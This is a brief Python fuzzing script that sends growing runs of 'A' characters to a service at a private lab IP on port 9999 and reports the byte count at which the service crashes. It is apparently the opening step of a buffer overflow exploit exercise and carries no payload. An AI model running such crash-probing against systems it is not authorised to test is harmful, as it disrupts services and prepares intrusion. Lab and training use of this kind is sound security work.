#!/usr/bin/env python3

import socket,time,sys

ip = "192.168.0.105"
port = 9999
timeout = 5
prefix = ""

string = prefix + "A" * 100

while True:
    try:
        with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip,port))
            s.recv(1024)
            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            s.send(bytes(string,"latin-1"))
            s.recv(1024)
    except:
        print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
        sys.exit(0)
    string += "A" * 100
    time.sleep(1)